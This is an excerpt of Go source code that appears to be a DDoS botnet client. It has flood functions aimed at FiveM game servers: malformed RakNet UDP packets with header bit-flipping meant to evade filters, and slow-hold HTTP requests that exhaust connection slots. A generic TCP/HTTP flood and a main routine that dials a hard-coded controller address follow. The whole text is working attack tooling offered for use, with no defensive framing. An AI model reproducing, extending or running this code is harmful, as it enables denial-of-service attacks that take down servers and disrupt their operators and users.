...
func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
	...
	// 1. UPDATED 'Nuclear' RakNet Malformed Vector (CPU Exhaustion)
	// Triggers expensive exception handling on the server side
	rakNetPayloads := [][]byte{
		[]byte("\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"), // Request 1
		[]byte("\x07\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x04\x01\x00\x00\x00\x00\x00"), // Request 2
		[]byte("\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"), // Ping
	}

	udpWorkers := 128
	if runtime.NumCPU() > 16 { udpWorkers = 512 }
	...
	for i := 0; i < udpWorkers; i++ {
		...
		go func() {
			...
			reconnect := func() {
				...
				conn, err = net.DialUDP("udp4", nil, raddr)
				if err == nil { conn.SetWriteBuffer(64 * 1024 * 1024) }
			}
			reconnect()
			if conn == nil { return }
			defer conn.Close()

			pIdx := uint32(rand.Intn(len(rakNetPayloads)))
			packetBuffer := make([]byte, 1024)

			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID { return }
				
				base := rakNetPayloads[pIdx%uint32(len(rakNetPayloads))]
				copy(packetBuffer, base)
				
				// MALFORMED: Randomize payload size to trigger length-mismatch exceptions
				malformedLen := len(base) + 16 + rand.Intn(64)
				for k := len(base); k < malformedLen; k++ {
					packetBuffer[k] = byte(rand.Intn(256))
				}
				
				// BIT-FLIPPING: Occasionally corrupt the header itself to bypass static filters
				if rand.Intn(100) < 5 {
					packetBuffer[rand.Intn(len(base))] ^= 0xFF
				}

				for j := 0; j < 500; j++ {
					conn.Write(packetBuffer[:malformedLen])
				}
				atomic.AddInt64(&ppsCounter, 500)
				pIdx++
	...
	// 2. Slow-TCP-Hold & Backend Stress (Target: players.json)
	// Exhausts max concurrent connections and CPU
	endpoints := []string{"/players.json", "/info.json"}
	
	httpWorkers := 256 // HIGH WORKERS for connection holding
	if runtime.NumCPU() > 16 { httpWorkers = 1024 }
	...
	for i := 0; i < httpWorkers; i++ {
		...
		go func() {
			...
			for {
				...
				if rand.Intn(10) < 8 { path = "/players.json" }
				
				// Request with cache-busting
				req := fmt.Sprintf("GET %s?v=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n", 
					path, rand.Int31(), IP, AUserAgents[rand.Intn(len(AUserAgents))])
				
				conn.Write([]byte(req))
				atomic.AddInt64(&hpsCounter, 1)
				
				// NUCLEAR: Slow-Hold. Keep the connection open as long as possible.
				// This exhausts the server's connection slot limit.
				holdTime := 15 + rand.Intn(45)
...
func ATcpHttpFlood(IP, PORT string, SECONDS int, sessionID int32) {
	...
	// ASYNCHRONOUS ENGINE: Never wait for timeouts, just keep firing
	workers := 1024 
	if runtime.NumCPU() > 16 {
		workers = runtime.NumCPU() * 64
	}
	...
	for i := 0; i < workers; i++ {
		...
		go func() {
			...
			for {
				...
				// FIRE-AND-FORGET: Launch each connection attempt in its own short-lived goroutine
				// This prevents the main worker from stalling on unresponsive targets
				go func() {
				...
				// Small delay to prevent local OS from being overwhelmed by goroutine creation
...
func main() {
	...
	controllerAddr := "5.175.221.107:9999"
	if len(os.Args) >= 2 {
